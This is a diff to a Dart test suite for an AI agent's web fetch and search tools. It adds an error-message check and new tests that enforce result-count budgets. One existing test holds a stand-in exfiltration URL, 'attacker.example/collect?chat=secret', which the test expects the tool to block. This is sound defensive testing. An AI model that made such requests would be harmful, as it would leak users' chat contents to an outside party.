@@ -143,6 +143,7 @@ void main() {
       'url': 'https://attacker.example/collect?chat=secret',
     });
     expect(exfiltration.isError, isTrue);
+    expect(exfiltration.text, contains('Call web_search'));
     expect(fetcher.fetched, isEmpty);
 
     final userLink = await session.execute(kWebFetchToolName, {
@@ -285,4 +286,47 @@ void main() {
     expect(result.isError, isTrue);
     expect(requests, 0);
   });
+
+  for (final budget in [WebToolBudget.compact, WebToolBudget.standard]) {
+    test(
+      'search enforces its ${budget.maxResults}-result budget at execution',
+      () async {
+        var requests = 0;
+        final session = _session(
+          search: Ddgs(
+            client: MockClient((_) async {
+              requests++;
+              return http.Response('', 200);
+            }),
+            engines: {
+              SearchEngineId.duckduckgo: _StubEngine([
+                for (var index = 0; index < 8; index++)
+                  ('Result $index', 'https://example.com/$index'),
+              ]),
+            },
+          ),
+          fetcher: _RecordingFetcher(),
+          budget: budget,
+        );
+        for (final (arguments, expectedCount) in [
+          ({'query': 'dart'}, budget.maxResults),
+          ({'query': 'dart', 'max_results': 1}, 1),
+          ({'query': 'dart', 'max_results': 100}, budget.maxResults),
+        ]) {
+          final result = await session.execute(kWebSearchToolName, arguments);
+          expect(result.isError, isFalse);
+          expect((result.value! as Map)['results'], hasLength(expectedCount));
+        }
+        final completedRequests = requests;
+        for (final invalid in [0, -1, 1.5, true, '3']) {
+          final result = await session.execute(kWebSearchToolName, {
+            'query': 'dart',
+            'max_results': invalid,
+          });
+          expect(result.isError, isTrue, reason: '$invalid');
+        }
+        expect(requests, completedRequests);
+      },
+    );
+  }
 }
